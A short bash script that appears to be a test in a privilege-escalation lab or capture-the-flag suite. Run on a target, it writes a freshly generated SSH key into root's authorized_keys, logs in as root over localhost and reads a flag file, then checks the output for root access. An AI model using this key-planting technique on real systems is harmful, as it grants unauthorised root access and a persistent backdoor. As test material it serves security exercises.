#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
ssh-keygen -t rsa -b 2048 -f /tmp/lowpriv_root -N "" -q
cat /tmp/lowpriv_root.pub > /root/.ssh/authorized_keys
PORT=$(awk "/^Port /{print \$2; exit}" /etc/ssh/sshd_config)
PORT=${PORT:-22}
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o PasswordAuthentication=no \
  -i /tmp/lowpriv_root -p "$PORT" root@127.0.0.1 "cat /root/flag.txt"
')"
assert_root_output "${out}"
